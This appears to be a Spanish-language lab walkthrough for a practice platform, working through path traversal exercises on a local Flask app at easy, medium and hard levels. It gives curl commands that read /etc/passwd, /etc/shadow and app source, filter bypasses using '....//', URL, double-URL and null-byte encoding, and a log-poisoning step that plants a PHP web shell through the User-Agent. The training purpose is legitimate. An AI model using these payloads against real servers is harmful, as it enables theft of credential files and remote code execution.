Easy — Path traversal directo

  1. El parametro file se concatena con la ruta base static/files/ sin ninguna validacion. Lee archivos del sistema directamente: 
    curl "http://localhost:5000/files?file=../../etc/passwd"
curl "http://localhost:5000/files?file=../../etc/shadow"
curl "http://localhost:5000/files?file=../../app.py"
  2. Lee el log de acceso (preparacion para log poisoning): 
    curl "http://localhost:5000/files?file=../../logs/access.log"
  3. Log poisoning (concepto de RCE): envenena el log enviando codigo en el User-Agent: 
    curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:5000/
  4. Verifica que el payload quedo registrado en el log: 
    curl "http://localhost:5000/files?file=../../logs/access.log"
    Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.

Medium — Bypass de filtro (strips ../ una vez)

  1. El servidor elimina ../ pero solo en un unico pase. Usa ....// para que tras el reemplazo quede ../: 
    curl "http://localhost:5000/files?file=....//....//etc/passwd"
  2. O URL encoding para evadir el filtro de cadena: 
    curl "http://localhost:5000/files?file=%2e%2e%2f%2e%2e%2fetc/passwd"
  3. Accede al log del servidor con el mismo bypass: 
    curl "http://localhost:5000/files?file=....//....//logs/access.log"

Hard — Bypass de filtro recursivo (double URL encoding)

  1. El filtro elimina ../ en bucle. Usa doble URL-encoding (%25 es %, por lo que %252e decodifica a %2e que decodifica a .): 
    curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"
  2. O null byte (en versiones antiguas de PHP para truncar la extension): 
    curl "http://localhost:5000/files?file=../../etc/passwd%00.jpg"
  3. Accede al log con el mismo bypass de doble encoding: 
    curl "http://localhost:5000/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"
